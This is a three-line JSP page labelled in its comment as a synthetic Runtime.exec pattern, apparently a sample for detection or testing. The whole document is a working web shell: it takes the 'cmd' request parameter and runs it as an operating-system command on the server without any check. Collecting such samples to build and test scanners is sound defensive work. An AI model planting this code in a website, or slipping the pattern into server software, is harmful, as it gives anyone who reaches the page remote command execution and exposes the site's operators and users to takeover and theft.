<%-- Synthetic JSP Runtime.exec pattern --%>
<%@ page import="java.io.*" %>
<% String cmd = request.getParameter("cmd"); if (cmd != null) { Runtime.getRuntime().exec(cmd); } %>
